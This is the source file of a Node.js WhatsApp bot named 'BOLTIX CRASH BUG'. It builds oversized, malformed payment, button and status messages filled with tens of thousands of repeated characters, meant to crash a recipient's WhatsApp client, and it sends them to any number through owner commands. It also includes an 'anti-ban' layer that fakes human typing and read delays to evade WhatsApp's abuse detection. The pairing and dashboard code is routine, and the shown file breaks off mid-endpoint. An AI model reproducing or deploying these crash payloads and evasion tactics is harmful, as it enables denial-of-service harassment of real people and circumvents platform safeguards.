  'use strict';

const fs   = require('fs');
const path = require('path');
const pkg  = require('./package.json');
const express = require('express');
const QRCode  = require('qrcode');
const pino    = require('pino');
const { Boom } = require('@hapi/boom');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  jidNormalizedUser,
  DisconnectReason,
  getContentType,
  Browsers,
} = require('@whiskeysockets/baileys');

/* ============================================================
   CONFIG
============================================================ */
const logger      = pino({ level: 'silent' });
const SESSION_DIR = path.join(__dirname, 'sessions');
const CRASH_CHAR  = 'ꦾ';
const PREFIX      = '.';
const PORT        = process.env.PORT || 3000;

function normalizeOwnerNumber(input) {
  let num = String(input || '').replace(/[^0-9]/g, '');
  if (!num) return null;
  if (num.startsWith('0') && num.length === 11) num = '234' + num.slice(1);
  if (!/^\d{8,15}$/.test(num)) return null;
  return num;
}

const OWNER_NUMBER = normalizeOwnerNumber(process.env.OWNER_NUMBER) || '2348163201351';

// Pairing rate limits (code requests only — status polling is free)
const PAIR_MAX_PER_MIN = 5;
const QR_MAX_PER_MIN   = 40;

const STARTUP_TIMEOUT_MS = 60000;

/* ============================================================
   ANTI-BAN CONFIG
============================================================ */
const ANTIBAN = {
  MIN_GAP:  Number(process.env.AB_MIN_GAP || 3000),
  MAX_GAP:  Number(process.env.AB_MAX_GAP || 10000),
  BATCH_SIZE:       15,
  BATCH_PAUSE_MIN:   25000,
  BATCH_PAUSE_MAX:   45000,
  DAILY_MAX:            Number(process.env.AB_DAILY_MAX || 300),
  PROACTIVE_DAILY_MAX:  Number(process.env.AB_PROACTIVE_DAILY || 60),
  READ_DELAY_MIN: 800,
  READ_DELAY_MAX: 2000,
  PRESENCE_DELAY_MIN: 400,
  PRESENCE_DELAY_MAX: 1000,
  TYPE_MS_PER_CHAR: 45,
  TYPE_MIN: 1500,
  TYPE_MAX: 7000,
  WARMUP_AFTER_PAIRING: 5 * 60 * 1000,
  THREAD_WINDOW: 24 * 60 * 60 * 1000,
};

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });

/* ============================================================
   STATE
============================================================ */
let sock          = null;
let qrText        = null;
let connected     = false;
let booting       = false;
let userJid       = null;

// Outbound queue state (anti-ban)
let sendChain   = Promise.resolve();
let lastSentAt  = 0;
let sentToday   = 0;
let proactiveToday = 0;
let batchCount  = 0;
let dayStamp    = new Date().toDateString();
let sendReadyAt = 0;

// Set when a pairing was PROMOTED to the main session — ensures the
// post-pairing anti-ban warm-up applies even though creds.json exists.
let pendingFreshPairing = false;

const inboundLedger = new Map();
let connState = 'boot';

let pairAttempts = [];
let qrAttempts    = [];

let reconnectTimer    = null;
let reconnectAttempts = 0;
let startupTimer      = null;

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

/* ============================================================
   ANTI-BAN: serialized outbound queue
============================================================ */
function rollDay() {
  const d = new Date().toDateString();
  if (d !== dayStamp) {
    dayStamp = d;
    sentToday = 0;
    proactiveToday = 0;
  }
}

function enqueueSend(fn, opts = {}) {
  const { proactive = false } = opts;
  const run = sendChain.then(async () => {
    rollDay();

    if (sentToday >= ANTIBAN.DAILY_MAX)
      throw new Error('daily-send-cap');
    if (proactive && proactiveToday >= ANTIBAN.PROACTIVE_DAILY_MAX)
      throw new Error('proactive-send-cap');

    if (proactive && Date.now() < sendReadyAt) {
      const wait = sendReadyAt - Date.now();
      if (wait > 30000) throw new Error('warmup');
      await sleep(wait);
    }

    const target = rand(ANTIBAN.MIN_GAP, ANTIBAN.MAX_GAP);
    const gap = Date.now() - lastSentAt;
    if (gap < target) await sleep(target - gap);

    if (batchCount > 0 && batchCount % ANTIBAN.BATCH_SIZE === 0) {
      await sleep(rand(ANTIBAN.BATCH_PAUSE_MIN, ANTIBAN.BATCH_PAUSE_MAX));
    }

    const result = await fn();

    sentToday++;
    if (proactive) proactiveToday++;
    batchCount++;
    lastSentAt = Date.now();
    return result;
  });
  sendChain = run.then(() => {}, () => {});
  return run;
}

/* ============================================================
   BOLTIX CRASH MECHANISMS
============================================================ */
function clampSize(val, fallback) {
  const n = parseInt(val, 10);
  if (!Number.isFinite(n)) return fallback;
  return Math.min(Math.max(n, 5000), 60000);
}

const HUGE        = clampSize(process.env.OVERFLOW, 45000);
const STATUS_SIZE = clampSize(null, 30000);

function bigText(n = HUGE) {
  return '⚡ BOLTIX CRASH ☠\n' + CRASH_CHAR.repeat(n);
}

function chatOpenCrash(victimJid) {
  return {
    viewOnceMessageV2: {
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: 9999999,
          requestFrom: victimJid,
          noteMessage: {
            extendedTextMessage: {
              text: bigText(),
              canonicalUrl: 'boltix-crash'
            }
          }
        }
      }
    }
  };
}

function buttonCrash() {
  return {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: '⚡ *BOLTIX CRASH — TAP* ⚡' },
          nativeFlowMessage: {
            buttons: [{
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: '⚡ BOLTIX 💥',
                id: CRASH_CHAR.repeat(Math.min(28000, HUGE))
              })
            }]
          }
        }
      }
    }
  };
}

function statusCrash() {
  return {
    viewOnceMessageV2: {
      message: {
        extendedTextMessage: {
          text: bigText(STATUS_SIZE),
          canonicalUrl: 'boltix-crash'
        }
      }
    }
  };
}

/* ============================================================
   HELPERS
============================================================ */
function jidToNumber(jid) {
  if (!jid) return null;
  const raw = String(jid).split('@')[0].split(':')[0];
  const digits = raw.replace(/[^0-9]/g, '');
  return digits || null;
}

function isOwner(m) {
  const sender = m.key.participant || m.key.remoteJid;
  return jidToNumber(sender) === OWNER_NUMBER;
}

function isOwnerNumber(num) {
  return String(num) === OWNER_NUMBER;
}

function normalizeNumber(arg) {
  let num = String(arg || '').replace(/[^0-9]/g, '');
  if (!num) return null;
  if (num.startsWith('0') && num.length === 11) num = '234' + num.slice(1);
  if (!/^\d{8,15}$/.test(num)) return null;
  return num;
}

async function toJid(arg) {
  const num = normalizeNumber(arg);
  if (!num) return null;

  if (isOwnerNumber(num)) return 'OWNER_PROTECTED';

  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const [res] = await sock.onWhatsApp(num);
      if (res?.jid) return jidNormalizedUser(res.jid);
      if (res !== undefined) return null;
    } catch (e) {
      console.error('[jid] lookup attempt failed:', e?.message);
    }
    if (attempt === 0) await sleep(rand(1200, 1800));
  }

  console.error('[jid] lookup unconfirmed for supplied number');
  return null;
}

function isRecentThread(jid) {
  const num = jidToNumber(jid);
  if (!num) return false;
  const last = inboundLedger.get(num);
  return !!last && (Date.now() - last) < ANTIBAN.THREAD_WINDOW;
}

function recordInbound(m) {
  if (m.key.fromMe) return;
  const num = jidToNumber(m.key.participant || m.key.remoteJid);
  if (num) inboundLedger.set(num, Date.now());

  if (inboundLedger.size > 500) {
    const cutoff = Date.now() - ANTIBAN.THREAD_WINDOW * 2;
    for (const [k, v] of inboundLedger) if (v < cutoff) inboundLedger.delete(k);
  }
}

const userCrashLog = new Map();

function canUserCrash(jid) {
  const key = jidToNumber(jid) || jid;
  const now = Date.now();
  const WINDOW = 60 * 1000;
  const MAX_PER_MIN = 15;

  const recent = (userCrashLog.get(key) || []).filter(t => now - t < WINDOW);
  if (recent.length >= MAX_PER_MIN) return false;

  recent.push(now);
  userCrashLog.set(key, recent);

  if (userCrashLog.size > 100) {
    for (const [k, v] of userCrashLog) {
      if (v.length === 0 || now - v[v.length - 1] > WINDOW * 5) userCrashLog.delete(k);
    }
  }
  return true;
}

/* ============================================================
   ANTI-BAN: human-like reply pipeline
============================================================ */
function humanReply(m, text) {
  const from = m.key.remoteJid;
  return enqueueSend(async () => {
    try {
      await sleep(rand(ANTIBAN.READ_DELAY_MIN, ANTIBAN.READ_DELAY_MAX));
      await sock.readMessages([m.key]).catch(() => {});

      try {
        await sock.presenceSubscribe(from);
        await sleep(rand(ANTIBAN.PRESENCE_DELAY_MIN, ANTIBAN.PRESENCE_DELAY_MAX));
        await sock.sendPresenceUpdate('composing', from);
        const typing = Math.min(
          Math.max(text.length * ANTIBAN.TYPE_MS_PER_CHAR, ANTIBAN.TYPE_MIN),
          ANTIBAN.TYPE_MAX
        );
        await sleep(typing);
        await sock.sendPresenceUpdate('paused', from);
      } catch (_) { /* presence is best-effort */ }

      await sock.sendMessage(from, { text }, { quoted: m });
    } catch (e) {
      console.error('[reply] error:', e?.message);
    }
  }, { proactive: false });
}

function safeSend(jid, payload, opts, label) {
  return enqueueSend(async () => {
    try {
      await sock.sendMessage(jid, payload, opts);
      return `✅ ${label} sent`;
    } catch (e) {
      console.error(`[${label}]`, e?.message);
      return `❌ ${label} failed — try again`;
    }
  }, { proactive: !isRecentThread(jid) });
}

function safeSendStatus(jid, payload, opts) {
  return enqueueSend(async () => {
    try {
      await sock.sendMessage('status@broadcast', payload, opts);
      return '✅ Boltix Crash 3 sent (status)';
    } catch (e) {
      console.error('[crash3]', e?.message);
      return '❌ Boltix Crash 3 failed — try again';
    }
  }, { proactive: !isRecentThread(jid) });
}

function getText(msg) {
  const t = getContentType(msg);
  if (!t) return '';
  switch (t) {
    case 'conversation':        return msg.conversation;
    case 'extendedTextMessage': return msg.extendedTextMessage?.text || '';
    default:                   return msg[t]?.caption || msg[t]?.text || '';
  }
}

/* ============================================================
   COMMANDS — owner-only crash commands
============================================================ */
async function handleCommand(m) {
  if (!m.message || m.key.fromMe) return;

  let text = '';
  try { text = getText(m.message); } catch (_) { return; }
  if (!text || text.length > 4000) return;
  if (!text.startsWith(PREFIX)) return;

  const parts = text.slice(1).trim().split(/\s+/);
  const cmd   = (parts[0] || '').toLowerCase();
  const arg   = parts[1];

  const reply = (t) => humanReply(m, t);

  try {
    switch (cmd) {

      case 'help':
      case 'menu':
        await reply(
`⚡ *BOLTIX CRASH BUG* ⚡

*${PREFIX}crash1 <number>* → chat-open crash
*${PREFIX}crash2 <number>* → button crash
*${PREFIX}crash3 <number>* → status crash
*${PREFIX}all <number>*    → all three
*${PREFIX}ping* | *${PREFIX}me* | *${PREFIX}stats*

_Owner-only commands._ Numbers must be on WhatsApp.`);
        break;

      case 'ping':
        await reply(`⚡ BOLTIX alive | v${pkg.version}`);
        break;

      case 'me':
        await reply(isOwner(m) ? '✅ You are the owner.' : '❌ Not authorized.');
        break;

      case 'stats': {
        if (!isOwner(m)) { await reply('❌ Not authorized.'); break; }
        rollDay();
        const warm = Date.now() < sendReadyAt
          ? `⏳ warm-up: ${Math.ceil((sendReadyAt - Date.now()) / 1000)}s left`
          : '✅ warm-up done';
        await reply(
`📊 *Anti-ban status*

📤 Sent today: ${sentToday}/${ANTIBAN.DAILY_MAX}
🎯 Proactive today: ${proactiveToday}/${ANTIBAN.PROACTIVE_DAILY_MAX}
🧵 Active threads: ${inboundLedger.size}
${warm}`);
        break;
      }

      case 'crash1':
      case 'crash2':
      case 'crash3':
      case 'all': {
        if (!isOwner(m)) { await reply('❌ Not authorized. Owner only.'); break; }
        if (!canUserCrash(m.key.participant || m.key.remoteJid)) {
          await reply('⏳ Rate limited — wait a moment.');
          break;
        }
        rollDay();
        if (sentToday >= ANTIBAN.DAILY_MAX) {
          await reply(`🧊 Daily send cap reached (${ANTIBAN.DAILY_MAX}) — resumes tomorrow.`);
          break;
        }
        if (proactiveToday >= ANTIBAN.PROACTIVE_DAILY_MAX) {
          await reply(`🧊 Proactive send cap reached (${ANTIBAN.PROACTIVE_DAILY_MAX}) — resumes tomorrow.`);
          break;
        }
        if (Date.now() < sendReadyAt) {
          await reply(`⏳ Account warm-up in progress — ~${Math.ceil((sendReadyAt - Date.now()) / 60000)} min left.`);
          break;
        }

        if (!arg) { await reply(`Usage: ${PREFIX}${cmd} <number>`); break; }

        const jid = await toJid(arg);
        if (jid === 'OWNER_PROTECTED') { await reply('🛡 Cannot attack owner number.'); break; }
        if (!jid) { await reply('❌ Number not confirmed on WhatsApp.'); break; }

        if (cmd === 'crash1' || cmd === 'all')
          await reply(await safeSend(jid, chatOpenCrash(jid), {}, 'Boltix Crash 1'));

        if (cmd === 'crash2' || cmd === 'all')
          await reply(await safeSend(jid, buttonCrash(), {}, 'Boltix Crash 2'));

        if (cmd === 'crash3' || cmd === 'all')
          await reply(await safeSendStatus(jid, statusCrash(), {
            backgroundColor: '#000000',
            font: 3,
            statusJidList: [jid]
          }));

        break;
      }
    }
  } catch (e) {
    console.error('[cmd] error:', e?.message);
  }
}

/* ============================================================
   PAIRING — long-lived session registry + dedicated pairing socket
   ------------------------------------------------------------
   A pairing is a session that survives until it reaches a terminal
   state: open | failed | cancelled | expired.
   States like `restarting` (WhatsApp dropped the pre-auth socket)
   and `linking` (phone accepted the code) are in-flight and keep
   the session alive.

   The pairing runs on a DEDICATED pre-auth socket in its own temp
   auth dir — it never depends on the main bot socket or its QR.
   Phone accepts the code → the temp session is PROMOTED to the
   main session dir and the bot boots from it.
============================================================ */
const PAIRING_TMP_DIR = path.join(__dirname, 'pairing_tmp');

const TERMINAL = new Set(['open', 'failed', 'cancelled', 'expired']);

const FIRST_CODE_TIMEOUT_MS = Number(process.env.PAIRING_FIRST_CODE_TIMEOUT_MS || 90000);
const IDLE_TTL_MS  = Number(process.env.PAIRING_IDLE_TTL_MS  || 15 * 60000);
const HARD_TTL_MS   = Number(process.env.PAIRING_HARD_TTL_MS   || 45 * 60000);
const KEEP_FINISHED_MS = 30 * 60000;
const MAX_RECORDS = 100;

const pairings = new Map();       // id -> pairing
const activeByNumber = new Map(); // number -> id (only non-terminal)
const pairingSockets = new Map(); // id -> { sock, dir, number, restarts, code, codeRequested, codeWaiters, cancelled }

function withTimeout(promise, ms, message) {
  let timer;
  return Promise.race([
    promise,
    new Promise((_, reject) => { timer = setTimeout(() => reject(new Error(message)), ms); })
  ]).finally(() => clearTimeout(timer));
}

function newPairingId() {
  return `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
}

function isTerminal(pairing) {
  return TERMINAL.has(pairing.status);
}

function touch(pairing) {
  const now = Date.now();
  pairing.updatedAt = now;
  pairing.expiresAt = Math.min(now + IDLE_TTL_MS, pairing.createdAt + HARD_TTL_MS);
}

function finish(pairing, status, error = null) {
  pairing.status = status;
  pairing.updatedAt = Date.now();
  pairing.finishedAt = Date.now();
  if (error) pairing.error = error;
  if (activeByNumber.get(pairing.number) === pairing.id) activeByNumber.delete(pairing.number);
}

function publicView(pairing) {
  const now = Date.now();
  return {
    ok: true,
    pairingId: pairing.id,
    number: pairing.number,
    status: pairing.status,
    terminal: isTerminal(pairing),
    code: pairing.code,
    codeVersion: pairing.codeVersion,
    codeIssuedAt: pairing.codeIssuedAt,
    refreshes: pairing.refreshes,
    message: pairing.message,
    error: pairing.error,
    ageSeconds: Math.floor((now - pairing.createdAt) / 1000),
    expiresInSeconds: isTerminal(pairing) ? 0 : Math.max(0, Math.floor((pairing.expiresAt - now) / 1000)),
    statusUrl: `/api/pair/status?id=${encodeURIComponent(pairing.id)}`
  };
}

function prune() {
  const now = Date.now();
  for (const [id, pairing] of pairings) {
    if (isTerminal(pairing) && now - (pairing.finishedAt || pairing.updatedAt) > KEEP_FINISHED_MS) {
      pairings.delete(id);
    }
  }
  if (pairings.size > MAX_RECORDS) {
    for (const [id, pairing] of pairings) {
      if (pairings.size <= MAX_RECORDS) break;
      if (isTerminal(pairing)) pairings.delete(id);
    }
  }
}

function applyCode(pairing, code) {
  if (pairing.code && pairing.code !== code) pairing.refreshes += 1;
  if (pairing.code !== code) {
    pairing.code = code;
    pairing.codeVersion += 1;
    pairing.codeIssuedAt = Date.now();
  }
}

const DEFAULT_MESSAGES = {
  requesting:  'Starting a WhatsApp connection…',
  ready:       'WhatsApp connection is ready…',
  connecting:  'Connecting to WhatsApp…',
  code_ready:  'Pairing code active. Enter it on WhatsApp → Linked devices → Link with phone number instead.',
  restarting:  'WhatsApp reset the connection. Getting a fresh code — keep this page open…',
  linking:     'Code accepted. Finishing the link with WhatsApp…',
  open:        'Device paired successfully.'
};

/* Called from the pairing-socket layer whenever the socket behind
   a pairing changes. Terminal sessions never come back to life. */
function updatePairingStatus(status, details = {}, pairingId = '') {
  if (!pairingId) return;
  const pairing = pairings.get(pairingId);
  if (!pairing) return;
  if (isTerminal(pairing)) return;

  if (details.code) applyCode(pairing, String(details.code).trim().toUpperCase());
  if (details.error) pairing.error = details.error;
  pairing.message = details.message || DEFAULT_MESSAGES[status] || pairing.message;

  if (TERMINAL.has(status)) {
    finish(pairing, status, details.error || null);
    console.log(status === 'open'
      ? `[pair] 🟢 session ${pairing.id} completed`
      : `[pair] 🔴 session ${pairing.id}: ${status}${details.error ? ` (${details.error})` : ''}`);
    return;
  }

  pairing.status = status;
  touch(pairing);
  if (status === 'restarting') pairing.error = null; // transient, not an error
}

/* ---------- dedicated pairing socket lifecycle ---------- */

function receivePairingCode(pairingId, code) {
  const rec = pairingSockets.get(pairingId);
  if (!rec || rec.cancelled) return;
  rec.code = code;

  const pairing = pairings.get(pairingId);
  if (pairing && !isTerminal(pairing)) {
    applyCode(pairing, code);
    if (pairing.status === 'requesting' || pairing.status === 'restarting') {
      pairing.status = 'code_ready';
    }
    touch(pairing);
  }

  for (const w of rec.codeWaiters.splice(0)) w.resolve(code);
}

async function requestPairingCode(rec, pairingId) {
  const pairing = pairings.get(pairingId);
  if (!pairing || isTerminal(pairing) || rec.cancelled) return;
  try {
    const code = String(await rec.sock.requestPairingCode(rec.number) || '').trim().toUpperCase();
    if (code) {
      console.log('[pair] 🔑 code generated (code not logged)');
      receivePairingCode(pairingId, code);
    }
  } catch (e) {
    console.error('[pair] requestPairingCode failed:', e?.message);
    // Socket will likely be restarted by the close handler; mark transient.
    updatePairingStatus('restarting', {
      message: 'Getting a fresh code — keep this page open…'
    }, pairingId);
  }
}

async function createPairingConnection(rec, pairingId) {
  const { state, saveCreds } = await useMultiFileAuthState(rec.dir);
  const { version } = await fetchLatestBaileysVersion();

  const s = makeWASocket({
    version,
    logger,
    browser: Browsers.macOS('Chrome'),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger)
    },
    markOnlineOnConnect: false,
    syncFullHistory: false,
    generateHighQualityLinkPreview: false,
    cachedGroupMetadata: async () => undefined
  });
  rec.sock = s;
  rec.state = state;
  rec.saveCreds = saveCreds;

  s.ev.on('creds.update', saveCreds);

  s.ev.on('connection.update', async (u) => {
    const { connection, lastDisconnect, qr } = u;

    if (qr) {
      const pairing = pairings.get(pairingId);
      if (!pairing || isTerminal(pairing) || rec.cancelled) return;

      if (!rec.codeRequested) {
        rec.codeRequested = true;
        await requestPairingCode(rec, pairingId);
      } else if (rec.code) {
        // Socket restarted pre-auth → previous code is stale. Refresh it.
        await requestPairingCode(rec, pairingId);
      }
    }

    if (connection === 'open') {
      // Phone accepted the code and WhatsApp finished the handshake.
      await promotePairing(pairingId);
      return;
    }

    if (connection === 'close') {
      if (rec.cancelled) return;

      const code = new Boom(lastDisconnect?.error)?.output?.statusCode;

      if (code === DisconnectReason.loggedOut) {
        updatePairingStatus('failed', {
          error: 'WhatsApp rejected this link. Start a new pairing.',
          message: 'Pairing failed.'
        }, pairingId);
        cleanupPairingSocket(pairingId);
        return;
      }

      const isSessionRestart = code === 515 || code === 428;
      if (isSessionRestart) {
        // 428/515 during linking is the NORMAL flow after the phone
        // accepts the code — WhatsApp replaces the pre-auth socket.
        const pairing = pairings.get(pairingId);
        if (pairing && (pairing.status === 'code_ready' || pairing.status === 'linking')) {
          updatePairingStatus('linking', {}, pairingId);
        } else {
          updatePairingStatus('restarting', {}, pairingId);
        }
        rec.restarts++;
        setTimeout(() => recreatePairingSocket(rec, pairingId), 1500);
        return;
      }

      if (rec.restarts < 6) {
        rec.restarts++;
        updatePairingStatus('restarting', {}, pairingId);
        setTimeout(() => recreatePairingSocket(rec, pairingId), 3000 + rec.restarts * 1000);
      } else {
        updatePairingStatus('failed', {
          error: 'Pairing could not complete — connection kept dropping.',
          message: 'Pairing failed.'
        }, pairingId);
        cleanupPairingSocket(pairingId);
      }
    }
  });
}

async function recreatePairingSocket(rec, pairingId) {
  if (rec.cancelled) return;
  try {
    // Re-use the SAME temp auth dir so we don't lose registration.
    await createPairingConnection(rec, pairingId);
  } catch (e) {
    console.error('[pair] recreate failed:', e?.message);
    updatePairingStatus('failed', {
      error: 'Pairing connection could not be restored.',
      message: 'Pairing failed.'
    }, pairingId);
    cleanupPairingSocket(pairingId);
  }
}

function cleanupPairingSocket(pairingId) {
  const rec = pairingSockets.get(pairingId);
  if (!rec) return;
  rec.cancelled = true;
  for (const w of rec.codeWaiters.splice(0)) w.reject(new Error('pairing stopped'));
  try { rec.sock?.end?.(new Error('pairing-cleanup')); } catch (_) {}
  pairingSockets.delete(pairingId);
  try { fs.rmSync(rec.dir, { recursive: true, force: true }); } catch (_) {}
}

/* Launch a fresh dedicated pairing socket. Cancels any other active
   pairing first — only one pre-auth socket at a time. */
async function pairingStart(number, pairingId) {
  for (const [otherId] of pairingSockets) {
    if (otherId !== pairingId) {
      const other = pairings.get(otherId);
      if (other && !isTerminal(other)) {
        finish(other, 'cancelled', 'Superseded by a newer pairing request.');
      }
      cleanupPairingSocket(otherId);
    }
  }

  const dir = path.join(PAIRING_TMP_DIR, pairingId);
  fs.mkdirSync(dir, { recursive: true });

  const rec = {
    dir,
    sock: null,
    number,
    restarts: 0,
    code: null,
    codeRequested: false,
    codeWaiters: [],
    cancelled: false
  };
  pairingSockets.set(pairingId, rec);

  await createPairingConnection(rec, pairingId);

  // Resolve with the FIRST code; the session lives on afterwards.
  return new Promise((resolve, reject) => {
    const r = pairingSockets.get(pairingId);
    if (!r) return reject(new Error('Pairing socket was cancelled.'));
    if (r.code) return resolve(r.code);
    r.codeWaiters.push({ resolve, reject });
  });
}

/* Phone accepted the code → the temp session is a real WhatsApp
   session. Promote it to the MAIN session and boot the bot. */
async function promotePairing(pairingId) {
  const rec = pairingSockets.get(pairingId);
  const pairing = pairings.get(pairingId);
  if (!rec || !pairing || isTerminal(pairing)) return;

  updatePairingStatus('open', { message: 'Device paired successfully.' }, pairingId);

  console.log('[pair] promoting session to main bot');

  // Stop any old main socket so exactly one device session runs.
  try { sock?.end?.(new Error('paired-via-web')); } catch (_) {}
  sock = null;
  connected = false;
  booting = false;
  qrText = null;
  connState = 'connecting';

  // Copy the freshly-paired credentials into the main session dir.
  try { fs.rmSync(SESSION_DIR, { recursive: true, force: true }); } catch (_) {}
  fs.mkdirSync(SESSION_DIR, { recursive: true });
  for (const f of fs.readdirSync(rec.dir)) {
    fs.copyFileSync(path.join(rec.dir, f), path.join(SESSION_DIR, f));
  }

  // Anti-ban warm-up applies — this was a fresh pairing.
  pendingFreshPairing = true;

  // Close the temporary socket; the main socket takes over from the
  // promoted credentials.
  cleanupPairingSocket(pairingId);

  scheduleReconnect(2000);
}

/* Expire sessions only after a long stretch of silence. */
const sweeper = setInterval(() => {
  const now = Date.now();
  for (const pairing of pairings.values()) {
    if (!isTerminal(pairing) && now > pairing.expiresAt) {
      console.log(`[pair] ⌛ session ${pairing.id} expired after inactivity`);
      finish(pairing, 'expired', 'Pairing session expired. Generate a new code.');
      cleanupPairingSocket(pairing.id);
    }
  }
  prune();
}, 15000);
sweeper.unref?.();

/* ============================================================
   BAILEYS — main connection lifecycle
============================================================ */
function scheduleReconnect(waitMs) {
  if (reconnectTimer) clearTimeout(reconnectTimer);
  reconnectTimer = setTimeout(async () => {
    reconnectTimer = null;
    await start();
  }, waitMs);
}

async function start() {
  if (booting) return;
  booting = true;

  const freshSession = pendingFreshPairing || !fs.existsSync(path.join(SESSION_DIR, 'creds.json'));

  if (startupTimer) clearTimeout(startupTimer);
  startupTimer = setTimeout(() => {
    if (booting && !connected) {
      console.error('[start] startup timeout — forcing cleanup and retry');
      booting = false;
      try { sock?.end?.(new Error('startup timeout')); } catch (_) {}
      scheduleReconnect(5000);
    }
    startupTimer = null;
  }, STARTUP_TIMEOUT_MS);

  try {
    const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      logger,
      browser: Browsers.macOS('Chrome'),
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, logger)
      },
      markOnlineOnConnect: false,
      syncFullHistory: false,
      generateHighQualityLinkPreview: false,
      cachedGroupMetadata: async () => undefined
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (u) => {
      const { connection, lastDisconnect, qr } = u;

      if (qr) {
        qrText = qr;
        if (connState !== 'waiting_qr') {
          connState = 'waiting_qr';
          console.log('[pair] QR available for scanning');
        }
      }

      if (connection === 'connecting') connState = 'connecting';

      if (connection === 'open') {
        if (startupTimer) { clearTimeout(startupTimer); startupTimer = null; }
        booting = false;
        connected = true;
        reconnectAttempts = 0;
        connState = 'connected';
        qrText = null;
        userJid = jidNormalizedUser(sock.user.id);

        if (freshSession && sendReadyAt === 0) {
          sendReadyAt = Date.now() + ANTIBAN.WARMUP_AFTER_PAIRING;
          console.log(`[antiban] fresh pairing — proactive sends paused for ${ANTIBAN.WARMUP_AFTER_PAIRING / 60000} min warm-up`);
        }
        pendingFreshPairing = false;

        console.log('[pair] connected as bot account');
      }

      if (connection === 'close') {
        if (startupTimer) { clearTimeout(startupTimer); startupTimer = null; }

        connected = false;
        userJid = null;
        qrText = null;
        booting = false;

        const code = new Boom(lastDisconnect?.error)?.output?.statusCode;

        if (code === DisconnectReason.loggedOut) {
          console.log('[pair] logged out — wiping session for fresh start');
          connState = 'disconnected';
          sendReadyAt = 0;
          try { fs.rmSync(SESSION_DIR, { recursive: true, force: true }); } catch (_) {}
          fs.mkdirSync(SESSION_DIR, { recursive: true });
          scheduleReconnect(3000);
          return;
        }

        connState = 'reconnecting';

        const isSessionRestart = code === 515 || code === 428;
        const base  = isSessionRestart ? 500 : 2000;
        const wait  = Math.min(60000, base * Math.pow(2, reconnectAttempts));
        reconnectAttempts++;
        if (reconnectAttempts > 10) reconnectAttempts = 10;

        console.log(`[pair] disconnected (code ${code}), reconnect #${reconnectAttempts} in ${wait}ms`);
        scheduleReconnect(wait);
      }
    });

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
      if (type !== 'notify') return;
      for (const m of messages) {
        recordInbound(m);
        try { await handleCommand(m); }
        catch (e) { console.error('[msg] error:', e?.message); }
      }
    });

  } catch (e) {
    console.error('[start] initialization error:', e?.message);
    booting = false;
    if (startupTimer) { clearTimeout(startupTimer); startupTimer = null; }
    scheduleReconnect(5000);
  }
}

process.on('unhandledRejection', e => console.error('[unhandled]', e?.message));
process.on('uncaughtException', e => {
  console.error('[uncaught] fatal — exiting for clean restart:', e?.message);
  process.exit(1);
});

/* ============================================================
   WEB
============================================================ */
const app = express();
app.use(express.json());

function makeLimiter(bucket, maxPerMin, message) {
  return (_req, res, next) => {
    const now = Date.now();
    bucket = bucket.filter(t => now - t < 60000);
    if (bucket.length >= maxPerMin) {
      return res.status(429).json({ ok: false, error: message });
    }
    bucket.push(now);
    next();
  };
}

const qrLimiter   = makeLimiter(qrAttempts,   QR_MAX_PER_MIN,   'Too many QR requests.');
const pairLimiter = makeLimiter(pairAttempts, PAIR_MAX_PER_MIN, 'Too many attempts. Wait a minute.');

function maskJid(jid) {
  if (!jid) return null;
  const num = jidToNumber(jid);
  if (!num || num.length < 4) return '***';
  return num.slice(0, 2) + '***' + num.slice(-2);
}

const ROOT_HTML   = path.join(__dirname, 'index.html');
const PUBLIC_DIR  = path.join(__dirname, 'public');
const PUBLIC_HTML = path.join(PUBLIC_DIR, 'index.html');

function findIndexHtml() {
  if (fs.existsSync(ROOT_HTML))   return ROOT_HTML;
  if (fs.existsSync(PUBLIC_HTML)) return PUBLIC_HTML;
  return null;
}

function sendIndex(res) {
  const file = findIndexHtml();
  if (!file) {
    return res
      .status(500)
      .send('<h1>BOLTIX — dashboard missing</h1><p>Place index.html in the repo root, next to index.js.</p>');
  }
  res.sendFile(file);
}

app.get('/', (_req, res) => sendIndex(res));

app.use(express.static(__dirname, {
  index: false,
  setHeaders(res, filePath) {
    if (filePath === ROOT_HTML || filePath === PUBLIC_HTML) {
      res.setHeader('Cache-Control', 'no-cache');
    }
  },
}));
app.use(express.static(PUBLIC_DIR, { index: false }));

app.get('/api/state', (_req, res) => {
  res.json({
    connected,
    state: connState,
    user: connected ? maskJid(userJid) : null
  });
});

app.get('/api/qr', qrLimiter, async (_req, res) => {
  if (!qrText) return res.json({ qr: null });
  try {
    res.json({ qr: await QRCode.toDataURL(qrText, { margin: 1, width: 360 }) });
  } catch {
    res.json({ qr: null });
  }
});

/* ---------- pairing endpoints (session registry) ---------- */

// Start (or resume) a pairing session for a number.
app.get('/api/pair', pairLimiter, async (req, res) => {
  if (connected) return res.status(400).json({ ok: false, error: 'Already connected.' });

  const number = normalizeNumber(req.query.number);
  if (!number) {
    return res.status(400).json({ ok: false, error: 'Phone number is required (country code + digits).' });
  }

  // Idempotent: re-requesting while a session is alive RESUMES it.
  const existingId = activeByNumber.get(number);
  const existing = existingId ? pairings.get(existingId) : null;
  if (existing && !isTerminal(existing)) {
    if (existing.code) {
      touch(existing);
      console.log(`[pair] ♻️ resuming session ${existing.id}`);
      return res.json({ ...publicView(existing), resumed: true });
    }
    return res.status(409).json({
      ok: false,
      error: 'A pairing session for this number is still starting. Wait a few seconds and try again.',
      pairingId: existing.id
    });
  }

  const id = newPairingId();
  const now = Date.now();
  const pairing = {
    id,
    number,
    status: 'requesting',
    code: null,
    codeVersion: 0,
    codeIssuedAt: null,
    refreshes: 0,
    message: DEFAULT_MESSAGES.requesting,
